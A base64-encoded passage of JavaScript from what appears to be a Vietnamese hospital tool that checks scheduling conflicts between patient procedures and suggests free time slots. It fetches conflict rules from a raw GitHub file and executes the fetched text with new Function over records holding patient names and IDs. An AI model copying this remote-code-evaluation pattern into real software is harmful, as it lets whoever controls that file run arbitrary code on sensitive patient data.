QgZW5kID0gcGFyc2VEYXRlVGltZShyb3dbZW5kSW5kZXhdLCByb3dOdW1iZXIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIXN0YXJ0IHx8ICFlbmQpIHsNCiAgIA0KICAgIHNraXBwZWRSb3dzKys7DQogICAgcmV0dXJuOw0KfQ0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoc3RhcnQuZGF0ZUtleSAhPT0gZW5kLmRhdGVLZXkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2dFcnJvcignVGjhu6cgdGh14bqtdCBi4bqvdCDEkeG6p3UgdsOgIGvhur90IHRow7pjIGtow6FjIG5nw6B5Jywgcm93TnVtYmVyLCB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXJ0RGF0ZTogc3RhcnQuZGF0ZUtleSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kRGF0ZTogZW5kLmRhdGVLZXksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhdGllbnROYW1lOiBuYW1lSW5kZXggIT09IC0xID8gcm93W25hbWVJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9jZWR1cmU6IHByb2NlZHVyZU5hbWUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBza2lwcGVkUm93cysrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGVuZC5zZWNvbmRzIDw9IHN0YXJ0LnNlY29uZHMpIHsNCiAgICBsb2dFcnJvcignVGjhu51pIGdpYW4ga+G6v3QgdGjDumMgcGjhuqNpIHNhdSB0aOG7nWkgZ2lhbiBi4bqvdCDEkeG6p3UnLCByb3dOdW1iZXIsIHsNCiAgICAgICAgc3RhcnRUaW1lOiBzdGFydC5kaXNwbGF5VGltZSwNCiAgICAgICAgZW5kVGltZTogZW5kLmRpc3BsYXlUaW1lLA0KICAgICAgICBzdGFydFZhbHVlOiByb3dbc3RhcnRJbmRleF0sDQogICAgICAgIGVuZFZhbHVlOiByb3dbZW5kSW5kZXhdLA0KICAgICAgICBwYXRpZW50TmFtZTogbmFtZUluZGV4ICE9PSAtMSA/IHJvd1tuYW1lSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgcHJvY2VkdXJlOiBwcm9jZWR1cmVOYW1lLA0KICAgICAgICBuZ2F5VGh1Y0hpZW46IGRhdGVJbmRleCAhPT0gLTEgPyByb3dbZGF0ZUluZGV4XSA6ICdLaMO0bmcgeMOhYyDEkeG7i25oJw0KICAgIH0pOw0KICAgIHNraXBwZWRSb3dzKys7DQogICAgcmV0dXJuOw0KfQ0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBleHBlY3RlZER1cmF0aW9uID0gUFJPQ0VEVVJFU1twcm9jZWR1cmVOYW1lXT8uZHVyYXRpb24gfHwgMDsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGFjdHVhbER1cmF0aW9uTWludXRlcyA9IChlbmQuc2Vjb25kcyAtIHN0YXJ0LnNlY29uZHMpIC8gNjA7DQogICAgICAgICAgICAgICAgICAgICAgICANCmlmIChleHBlY3RlZER1cmF0aW9uID4gMCAmJiBNYXRoLmFicyhhY3R1YWxEdXJhdGlvbk1pbnV0ZXMgLSBleHBlY3RlZER1cmF0aW9uKSA+IDEpIHsNCiAgICBsb2dFcnJvcihgYCwgcm93TnVtYmVyLCB7DQogICAgICAgIHByb2NlZHVyZTogcHJvY2VkdXJlTmFtZSwNCiAgICAgICAgZXhwZWN0ZWQ6IGV4cGVjdGVkRHVyYXRpb24sDQogICAgICAgIGFjdHVhbDogYWN0dWFsRHVyYXRpb25NaW51dGVzLA0KICAgICAgICBwYXRpZW50TmFtZTogbmFtZUluZGV4ICE9PSAtMSA/IHJvd1tuYW1lSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgb3BlcmF0b3I6IHJvd1tvcGVyYXRvckluZGV4XSA/IHJvd1tvcGVyYXRvckluZGV4XS5yZXBsYWNlKC8sL2csICcnKSA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgZGF0ZTogc3RhcnQuZGF0ZUtleSwNCiAgICAgICAgbmdheVRodWNIaWVuOiBkYXRlSW5kZXggIT09IC0xID8gcm93W2RhdGVJbmRleF0gOiAnS2jDtG5nIHjDoWMgxJHhu4tuaCcsDQogICAgICAgIHN0YXJ0VGltZTogc3RhcnQuZGlzcGxheVRpbWUsDQogICAgICAgIGVuZFRpbWU6IGVuZC5kaXNwbGF5VGltZSwNCiAgICAgICAgZG9jdG9yOiByb3dbZG9jdG9ySW5kZXhdIHx8ICdLaMO0bmcgY8OzJyAvLyBUaMOqbSBkw7JuZyBuw6B5DQogICAgfSk7DQp9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHByb2NlZHVyZU5hbWUgPT09ICdT4bqvYyB0aHXhu5FjIHRoYW5nJykgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhlcmJQcm9jZWR1cmVzLnB1c2gocHJvY2VkdXJlc1twcm9jZWR1cmVzLmxlbmd0aCAtIDFdKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIHByb2NlZHVyZXMucHVzaCh7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcm93SW5kZXg6IHJvd051bWJlciwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXRpZW50TmFtZTogbmFtZUluZGV4ICE9PSAtMSA/IHJvd1tuYW1lSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXRpZW50SWQ6IHBhdGllbnRJZEluZGV4ICE9PSAtMSA/IHJvd1twYXRpZW50SWRJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb2NlZHVyZTogcHJvY2VkdXJlTmFtZSwNCgkJCQkJCQlkb2N0b3I6IHJvd1tkb2N0b3JJbmRleF0gfHwgJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGU6IHN0YXJ0LmRhdGVLZXksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhcnQ6IHN0YXJ0LnNlY29uZHMsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kOiBlbmQuc2Vjb25kcywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXNwbGF5U3RhcnQ6IHN0YXJ0LmRpc3BsYXlUaW1lLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpc3BsYXlFbmQ6IGVuZC5kaXNwbGF5VGltZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcGVyYXRvcjogcm93W29wZXJhdG9ySW5kZXhdIHx8ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25mbGljdDogZmFsc2UsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uZmxpY3RSZWFzb246ICcnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb2NlZHVyZUluZm86IFBST0NFRFVSRVNbcHJvY2VkdXJlTmFtZV0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3VnZ2VzdGlvbjogJycNCiAgICAgICAgICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChlcnJvcikgew0KICAgICAgICAgICAgICAgICAgICAgICAgbG9nRXJyb3IoYEzhu5dpIHjhu60gbMO9IGTDsm5nOiAke2Vycm9yLm1lc3NhZ2V9YCwgcm93TnVtYmVyLCB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF0aWVudE5hbWU6IG5hbWVJbmRleCAhPT0gLTEgPyByb3dbbmFtZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlOiByb3dbcHJvY2VkdXJlSW5kZXhdIHx8ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlcnJvckRldGFpbHM6IGVycm9yLnN0YWNrDQogICAgICAgICAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHNraXBwZWRSb3dzKys7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBpZiAocHJvY2VkdXJlcy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCdLaMO0bmcgY8OzIHRo4bunIHRodeG6rXQgbsOgbyBo4bujcCBs4buHIMSR4buDIGtp4buDbSB0cmEuIFZ1aSBsw7JuZyBraeG7g20gdHJhIGzhuqFpIGThu68gbGnhu4d1LicpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBjaGVja0NvbmZsaWN0cyhwcm9jZWR1cmVzKTsNCiAgICAgICAgICAgICAgICBnZW5lcmF0ZVRpbWVTdWdnZXN0aW9ucyhwcm9jZWR1cmVzKTsNCiAgICAgICAgICAgICAgICBkaXNwbGF5UmVzdWx0cyhwcm9jZWR1cmVzLCBza2lwcGVkUm93cyk7DQogICAgICAgICAgICAgICAgd2luZG93LmFsbEhlcmJQcm9jZWR1cmVzID0gaGVyYlByb2NlZHVyZXM7DQoJCQkJLy8gLS0tIEPhuq1wIG5o4bqtdCBz4buRIGNhIGtow6FjIMSRYSBz4buRIHRyw6puIG7DunQgLS0tDQpzZXRUaW1lb3V0KCgpID0+IHsNCiAgaWYgKHR5cGVvZiB1cGRhdGVIZXJiQnV0dG9uV2l0aE91dGxpZXJDb3VudCA9PT0gJ2Z1bmN0aW9uJykgew0KICAgIHVwZGF0ZUhlcmJCdXR0b25XaXRoT3V0bGllckNvdW50KCk7DQogIH0NCn0sIDEwMCk7DQoNCiAgICAgICAgICAgICAgICBkaXNwbGF5RXJyb3JzKCk7DQogICAgICAgICAgICB9IGNhdGNoIChlcnJvcikgew0KICAgICAgICAgICAgICAgIGxvZ0Vycm9yKGVycm9yLm1lc3NhZ2UsIG51bGwsIGVycm9yLnN0YWNrKTsNCiAgICAgICAgICAgICAgICBkaXNwbGF5RXJyb3JzKCk7DQogICAgICAgICAgICAgICAgYWxlcnQoJ0PDsyBs4buXaSB44bqjeSByYSBraGkgeOG7rSBsw70gZOG7ryBsaeG7h3U6ICcgKyBlcnJvci5tZXNzYWdlKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQoNCmxldCBjb25mbGljdFJ1bGVzVGV4dCA9ICcnOw0KDQphc3luYyBmdW5jdGlvbiBsb2FkQ29uZmxpY3RSdWxlcygpIHsNCiAgICB0cnkgew0KICAgICAgICBjb25zdCB1cmwgPSAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoYXVodXluaDAxMDQvY2hhdWh1eW5oMDEwNC50eHQvcmVmcy9oZWFkcy9tYWluL2NoYXVfeGx0aHV0aHVhdC50eHQ/dHM9JyArIERhdGUubm93KCk7DQogICAgICAgIGNvbnN0IHJlcyA9IGF3YWl0IGZldGNoKHVybCk7DQogICAgICAgIGlmICghcmVzLm9rKSB0aHJvdyBuZXcgRXJyb3IoJ0tow7RuZyB04bqjaSDEkcaw4bujYyBjaGF1X3hsdGh1dGh1YXQudHh0Jyk7DQogICAgICAgIGNvbmZsaWN0UnVsZXNUZXh0ID0gKGF3YWl0IHJlcy50ZXh0KCkpLnRyaW0oKTsNCiAgICB9IGNhdGNoIChlKSB7DQogICAgICAgIGNvbnNvbGUuZXJyb3IoJ0zhu5dpIHThuqNpIGNoYXVfeGx0aHV0aHVhdC50eHQ6JywgZSk7DQogICAgICAgIGNvbmZsaWN0UnVsZXNUZXh0ID0gJyc7IC8vIGZhbGxiYWNrOiBy4buXbmcgLT4gY29pIG5oxrAga2jDtG5nIGPDsyBuZ2/huqFpIGzhu4cNCiAgICB9DQp9DQoNCg0KDQoNCiAgICAgICAgZnVuY3Rpb24gY2hlY2tDb25mbGljdHMocHJvY2VkdXJlcykgew0KICAgICAgICAgICAgY29uc3QgaWdub3JlQWRqYWNlbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaWdub3JlQWRqYWNlbnRDaGVja2JveCcpLmNoZWNrZWQ7DQogICAgICAgICAgICBjb25zdCBncm91cHMgPSB7fTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgcHJvY2VkdXJlcy5mb3JFYWNoKHByb2MgPT4gew0KICAgICAgICAgICAgICAgIGNvbnN0IGtleSA9IGAke3Byb2Mub3BlcmF0b3J9XyR7cHJvYy5kYXRlfWA7DQogICAgICAgICAgICAgICAgaWYgKCFncm91cHNba2V5XSkgew0KICAgICAgICAgICAgICAgICAgICBncm91cHNba2V5XSA9IFtdOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBncm91cHNba2V5XS5wdXNoKHByb2MpOw0KICAgICAgICAgICAgfSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIE9iamVjdC52YWx1ZXMoZ3JvdXBzKS5mb3JFYWNoKGdyb3VwID0+IHsNCiAgICAgICAgICAgICAgICBncm91cC5zb3J0KChhLCBiKSA9PiBhLnN0YXJ0IC0gYi5zdGFydCk7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgZm9yIChsZXQgaSA9IDE7IGkgPCBncm91cC5sZW5ndGg7IGkrKykgew0KICAgICAgICAgICAgICAgICAgICBjb25zdCBwcmV2ID0gZ3JvdXBbaSAtIDFdOw0KICAgICAgICAgICAgICAgICAgICBjb25zdCBjdXJyZW50ID0gZ3JvdXBbaV07DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IHByZXZFbmRXaXRoQnVmZmVyID0gcHJldi5lbmQgKyAocHJldi5wcm9jZWR1cmVJbmZvPy5idWZmZXIgfHwgMCkgKiA2MDsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGNvbnN0IGlzQWRqYWNlbnQgPSBpZ25vcmVBZGphY2VudCAmJiBjdXJyZW50LnN0YXJ0ID09PSBwcmV2LmVuZDsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGlmIChjdXJyZW50LnN0YXJ0IDwgcHJldkVuZFdpdGhCdWZmZXIgJiYgIWlzQWRqYWNlbnQpIHsNCiAgICAgICAgICAgICAgICAgDQoNCmxldCBpc0NvbmZsaWN0ID0gdHJ1ZTsNCiAgICB0cnkgew0KICAgICAgICBpZiAoY29uZmxpY3RSdWxlc1RleHQgJiYgY29uZmxpY3RSdWxlc1RleHQudHJpbSgpKSB7DQogICAgICAgICAgICBjb25zdCBjb25mbGljdENvbmRpdGlvbiA9IG5ldyBGdW5jdGlvbigncHJldicsJ2N1cnJlbnQnLCdyZXR1cm4gJyArIGNvbmZsaWN0UnVsZXNUZXh0LnRyaW0oKSk7DQogICAgICAgICAgICAvLyBjb25mbGljdENvbmRpdGlvbigpIFRS4bqiIFbhu4AgdHJ1ZSBu4bq/dSAqxJHGsOG7o2MgbWnhu4VuIHh1bmcgxJHhu5l0Kg0KICAgICAgICAgICAgY29uc3QgYWxsb3dlZCA9IGNvbmZsaWN0Q29uZGl0aW9uKHByZXYsIGN1cnJlbnQpOw0KICAgICAgICAgICAgaXNDb25mbGljdCA9ICFhbGxvd2VkOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgaXNDb25mbGljdCA9IHRydWU7IC8vIGtow7RuZyBjw7MgcnVsZSAtPiBj4bupIGLDoW8geHVuZyDEkeG7mXQNCiAgICAgICAgfQ0KICAgIH0gY2F0Y2ggKGVycikgew0KICAgICAgICBjb25zb2xlLmVycm9yKCdM4buXaSBraGkgxJHDoW5oIGdpw6EgeHVuZyDEkeG7mXQgdGjhu51pIGdpYW46JywgZXJyKTsNCiAgICAgICAgaXNDb25mbGljdCA9IHRydWU7DQogICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoaXNDb25mbGljdCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGN1cnJlbnQuY29uZmxpY3QgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGN1cnJlbnQuY29uZmxpY3RSZWFzb24gPSBgJHtwcmV2LnByb2NlZHVyZX08YnI+4oCiIELhu4duaCBuaMOibjogJHtwcmV2LnBhdGllbnROYW1lfTxicj7igKIgTmfDoHk6ICR7cHJldi5kYXRlfTxicj7igKIgVGjhu51pIGdpYW46ICR7cHJldi5kaXNwbGF5U3RhcnR9LSR7cHJldi5kaXNwbGF5RW5kfWA7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmV2LmNvbmZsaWN0ID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIXByZXYuY29uZmxpY3RSZWFzb24uaW5jbHVkZXMoY3VycmVudC5wcm9jZWR1cmUpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByZXYuY29uZmxpY3RSZWFzb24gKz0gKHByZXYuY29uZmxpY3RSZWFzb24gPyAnPGJyPjxicj4nIDogJycpICsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBgICR7Y3VycmVudC5wcm9jZWR1cmV9PGJyPuKAoiBC4buHbmggbmjDom46ICR7Y3VycmVudC5wYXRpZW50TmFtZX08YnI+4oCiIE5nw6B5OiAke2N1cnJlbnQuZGF0ZX08YnI+4oCiIFRo4budaSBnaWFuOiAke2N1cnJlbnQuZGlzcGxheVN0YXJ0fS0ke2N1cnJlbnQuZGlzcGxheUVuZH1gOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0pOw0KICAgICAgICB9DQoNCmZ1bmN0aW9uIGdlbmVyYXRlVGltZVN1Z2dlc3Rpb25zKHByb2NlZHVyZXMpIHsNCiAgICBjb25zdCB0aW1lT3B0aW9uID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcignaW5wdXRbbmFtZT0idGltZU9wdGlvbiJdOmNoZWNrZWQnKS52YWx1ZTsNCiAgICBjb25zdCBzdGFydEhvdXIgPSB0aW1lT3B0aW9uID09PSAnNzozMCcgPyA3LjUgOiA3Ow0KICAgIGNvbnN0IGlnbm9yZUFkamFjZW50ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2lnbm9yZUFkamFjZW50Q2hlY2tib3gnKS5jaGVja2VkOw0KICAgIGNvbnN0IGJ1ZmZlck1pbnV0ZXMgPSBpZ25vcmVBZGphY2VudCA/IDAgOiAxOw0KICAgIGNvbnN0IHNob3dNb3JlU3VnZ2VzdGlvbnMgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd01vcmVTdWdnZXN0aW9uc0NoZWNrYm94JykuY2hlY2tlZDsNCiAgICANCiAgICAvLyBT4buRIGtodW5nIGdp4budIHThu5FpIMSRYSBt4buXaSBideG7lWkgKG7hur91IGNo4buNbiA2IGtodW5nIHRow6wgMyBzw6FuZyArIDMgY2hp4buBdSkNCiAgICBjb25zdCBtYXhNb3JuaW5nID0gc2hvd01vcmVTdWdnZXN0aW9ucyA/IDMgOiAyOw0KICAgIGNvbnN0IG1heEFmdGVybm9vbiA9IHNob3dNb3JlU3VnZ2VzdGlvbnMgPyAzIDogMTsNCg0KICAgIHByb2NlZHVyZXMuZm9yRWFjaChwcm9jID0+IHsNCiAgICAgICAgaWYgKCFwcm9jLmNvbmZsaWN0KSByZXR1cm47DQoNCiAgICAgICAgY29uc3Qgc2FtZURheVByb2NlZHVyZXMgPSBwcm9jZWR1cmVzLmZpbHRlcihwID0+IA0KICAgICAgICAgICAgcC5kYXRlID09PSBwcm9jLmRhdGUgJiYgDQogICAgICAgICAgICBwLm9wZXJhdG9yID09PSBwcm9jLm9wZXJhdG9yICYmDQogICAgICAgICAgICBwLnJvd0luZGV4ICE9PSBwcm9jLnJvd0luZGV4DQogICAgICAgICk7DQoNCiAgICAgICAgY29uc3QgZHVyYXRpb25TZWNvbmRzID0gcHJvYy5lbmQgLSBwcm9jLnN0YXJ0ICsgKGJ1ZmZlck1pbnV0ZXMgKiA2MCk7DQogICAgICAgIA0KICAgICAgICAvLyBUw6xtIGtodW5nIGdp4budIGJ14buVaSBzw6FuZw0KICAgICAgICBjb25zdCBtb3JuaW5nU2xvdHMgPSBmaW5kQXZhaWxhYmxlU2xvdHMoDQogICAgICAgICAgICBzdGFydEhvdXIgKiAzNjAwLCANCiAgICAgICAgICAgIDExLjUgKiAzNjAwLCANCiAgICAgICAgICAgIGR1cmF0aW9uU2Vjb25kcywgDQogICAgICAgICAgICBzYW1lRGF5UHJvY2VkdXJlcywgDQogICAgICAgICAgICBtYXhNb3JuaW5nDQogICAgICAgICk7DQogICAgICAgIA0KICAgICAgICAvLyBUw6xtIGtodW5nIGdp4budIGJ14buVaSBjaGnhu4F1DQogICAgICAgIGNvbnN0IGFmdGVybm9vblNsb3RzID0gZmluZEF2YWlsYWJsZVNsb3RzKA0KICAgICAgICAgICAgMTMuNSAqIDM2MDAsIA0KICAgICAgICAgICAgMTcgKiAzNjAwLCANCiAgICAgICAgICAgIGR1cmF0aW9uU2Vjb25kcywgDQogICAgICAgICAgICBzYW1lRGF5UHJvY2VkdXJlcywgDQogICAgICAgICAgICBtYXhBZnRlcm5vb24NCiAgICAgICAgKTsNCg0KICAgICAgICAvLyBGb3JtYXQga+G6v3QgcXXhuqMNCiAgICAgICAgbGV0IHN1Z2dlc3Rpb25zID0gW107DQogICAgICAgIGlmIChtb3JuaW5nU2xvdHMubGVuZ3RoID4gMCkgew0KICAgICAgICAgICAgc3VnZ2VzdGlvbnMucHVzaCgnPHN0cm9uZz5Tw6FuZzo8L3N0cm9uZz48YnI+JyArIA0KICAgICAgICAgICAgICAgIG1vcm5pbmdTbG90cy5tYXAoc2xvdCA9PiBgJHtzbG90LnN0YXJ0fSAtICR7c2xvdC5lbmR9YCkuam9pbignPGJyPicpKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoYWZ0ZXJub29uU2xvdHMubGVuZ3RoID4gMCkgew0KICAgICAgICAgICAgc3VnZ2VzdGlvbnMucHVzaCgnPHN0cm9uZz5DaGnhu4F1Ojwvc3Ryb25nPjxicj4nICsgDQogICAgICAgICAgICAgICAgYWZ0ZXJub29uU2xvdHMubWFwKHNsb3QgPT4gYCR7c2xvdC5zdGFydH0gLSAke3Nsb3QuZW5kfWApLmpvaW4oJzxicj4nKSk7DQogICAgICAgIH0NCg0KICAgICAgICANCmlmIChtb3JuaW5nU2xvdHMubGVuZ3RoICsgYWZ0ZXJub29uU2xvdHMubGVuZ3RoID4gMCkgew0KICAgIGNvbnN0IGZpcnN0U2xvdCA9IG1vcm5pbmdTbG90c1swXSB8fCBhZnRlcm5vb25TbG90c1swXTsNCiAgICBjb25zdCBzbWFydEhpbnQgPSBgPGJyPjxkaXYgc3R5bGU9Im1hcmdpbi10b3A6NnB4O2NvbG9yOiMwMDc5NmI7Zm9udC13ZWlnaHQ6NjAwIj4NCiAgICDwn5GJIEfhu6NpIMO9OiBE4budaSB04burIDx1PiR7cHJvYy5kaXNwbGF5U3RhcnR9PC91PiDihpIgPHU+JHtmaXJzdFNsb3Quc3RhcnR9PC91Pg0KICAgIDwvZGl2PmA7DQoNCiAgICBwcm9jLnN1Z2dlc3Rpb24gPSBzdWdnZXN0aW9ucy5qb2luKCc8YnI+JykgKyBzbWFydEhpbnQ7DQp9IGVsc2Ugew0KICAgIHByb2Muc3VnZ2VzdGlvbiA9ICc8c3BhbiBjbGFzcz0ibm8tc3VnZ2VzdGlvbiI+S2jDtG5nIGPDsyBraHVuZyBnaeG7nSB0cuG7kW5nPC9zcGFuPic7DQp9DQoNCiAgICB9KTsNCn0NCi8vIEjDoG0ga2nhu4NtIHRyYSB4dW5nIMSR4buZdCB0aOG7nWkgZ2lhbg0KZnVuY3Rpb24gaGFzVGltZUNvbmZsaWN0KHN0YXJ0VGltZSwgZHVyYXRpb24sIHByb2NlZHVyZXMpIHsNCiAgICBjb25zdCBlbmRUaW1lID0gc3RhcnRUaW1lICsgZHVyYXRpb247DQogICAgDQogICAgZm9yIChjb25zdCBwcm9jIG9mIHByb2NlZHVyZXMpIHsNCiAgICAgICAgY29uc3QgcHJvY1N0YXJ0ID0gcHJvYy5zdGFydDsNCiAgICAgICAgY29uc3QgcHJvY0VuZCA9IHByb2MuZW5kICsgKHByb2MucHJvY2VkdXJlSW5mbz8uYnVmZmVyIHx8IDApICogNjA7DQogICAgICAgIA0KICAgICAgICBpZiAoKHN0YXJ0VGltZSA+PSBwcm9jU3RhcnQgJiYgc3RhcnRUaW1lIDwgcHJvY0VuZCkgfHwgDQogICAgICAgICAgICAoZW5kVGltZSA+IHByb2NTdGFydCAmJiBlbmRUaW1lIDw9IHByb2NFbmQpIHx8DQogICAgICAgICAgICAoc3RhcnRUaW1lIDw9IHByb2NTdGFydCAmJiBlbmRUaW1lID49IHByb2NFbmQpKSB7DQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICANCiAgICByZXR1cm4gZmFsc2U7DQp9DQovLyBIw6BtIHTDrG0ga2h1bmcgZ2nhu50gdHLhu5FuZw0KZnVuY3Rpb24gZmluZEF2YWlsYWJsZVNsb3RzKHN0YXJ0VGltZSwgZW5kVGltZSwgZHVyYXRpb24sIHByb2NlZHVyZXMsIG1heFNsb3RzKSB7DQogICAgY29uc3Qgc2xvdHMgPSBbXTsNCiAgICBsZXQgY3VycmVudFRpbWUgPSBzdGFydFRpbWU7DQogICAgY29uc3QgaWdub3JlQWRqYWNlbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaWdub3JlQWRqYWNlbnRDaGVja2JveCcpLmNoZWNrZWQ7DQogICAgY29uc3QgYnVmZmVyTWludXRlcyA9IGlnbm9yZUFkamFjZW50ID8gMCA6IDE7DQogICAgDQogICAgd2hpbGUgKGN1cnJlbnRUaW1lICsgZHVyYXRpb24gPD0gZW5kVGltZSAmJiBzbG90cy5sZW5ndGggPCBtYXhTbG90cykgew0KICAgICAgICBpZiAoIWhhc1RpbWVDb25mbGljdChjdXJyZW50VGltZSwgZHVyYXRpb24sIHByb2NlZHVyZXMpKSB7DQogICAgICAgICAgICBzbG90cy5wdXNoKHsNCiAgICAgICAgICAgICAgICBzdGFydDogc2Vjb25kc1RvVGltZVN0cihjdXJyZW50VGltZSksDQogICAgICAgICAgICAgICAgZW5kOiBzZWNvbmRzVG9UaW1lU3RyKGN1cnJlbnRUaW1lICsgKGR1cmF0aW9uIC0gKGJ1ZmZlck1pbnV0ZXMgKiA2MCkpKSAvLyBUcuG7qyBidWZmZXIgxJHhu4MgaGnhu4NuIHRo4buLDQogICAgICAgICAgICB9KTsNCiAgICAgICAgfQ0KICAgICAgICBjdXJyZW50VGltZSArPSAxNSAqIDYwOyAvLyBLaeG7g20gdHJhIG3hu5dpIDE1IHBow7p0DQogICAgfQ0KICAgIA0KICAgIHJldHVybiBzbG90czsNCn0NCg0KICAgICAgICBmdW5jdGlvbiBzZWNvbmRzVG9UaW1lU3RyKHNlY29uZHMpIHsNCiAgICAgICAgICAgIGNvbnN0IGhvdXJzID0gTWF0aC5mbG9vcihzZWNvbmRzIC8gMzYwMCk7DQogICAgICAgICAgICBjb25zdCBtaW51dGVzID0gTWF0aC5mbG9vcigoc2Vjb25kcyAlIDM2MDApIC8gNjApOw0KICAgICAgICAgICAgcmV0dXJuIGAke2hvdXJzLnRvU3RyaW5nKCkucGFkU3RhcnQoMiwgJzAnKX06JHttaW51dGVzLnRvU3RyaW5nKCkucGFkU3RhcnQoMiwgJzAnKX1gOw0KICAgICAgICB9DQoNCg0KLy8gxJDhur9tIHThu5VuZyBjYSAic+G6r2MgdGh14buRYyIga2jDoWMgxJFhIHPhu5EgKG91dGxpZXIpDQpmdW5jdGlvbiBnZXRIZXJiT3V0bGllclRvdGFsKCkgew0KICBjb25zdCBoZXJicyA9IEFycmF5LmlzQXJyYXkod2luZG93LmFsbEhlcmJQcm9jZWR1cmVzKSA/IHdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlcyA6IFtdOw0KICBjb25zdCBjb3VudHNCeURhdGUgPSB7fTsNCiAgaGVyYnMuZm9yRWFjaChoID0+IHsNCiAgICBjb25zdCBkID0gaC5kYXRlOw0KICAgIGNvbnN0IG4gPSA